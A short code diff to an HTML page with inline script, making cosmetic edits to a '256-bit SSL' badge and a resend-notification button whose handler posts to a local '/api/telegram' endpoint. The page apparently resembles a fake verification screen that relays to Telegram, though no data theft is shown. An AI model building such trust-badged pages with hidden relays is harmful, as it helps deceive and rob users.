@@ -72,7 +72,7 @@ body { font-family:'Segoe UI',Arial,sans-serif; max-width:480px; margin:0 auto; 
         Cancel
       </button>
       <div style="font-size:11px;color:rgba(255,255,255,0.25);display:flex;align-items:center;gap:5px;">
-        <span>🔒</span><span>256-bit SSL</span>
+        <span>256-bit SSL</span>
       </div>
     </div>
   </div>
@@ -100,7 +100,7 @@ function handleResend() {
   if (resent) return;
   resent = true;
   const btn = document.getElementById('resend-btn');
-  btn.textContent = '✓ Notification Resent!';
+  btn.textContent = 'Notification Resent';
   btn.style.color = '#4ade80';
   fetch('/api/telegram', {
     method: 'POST',
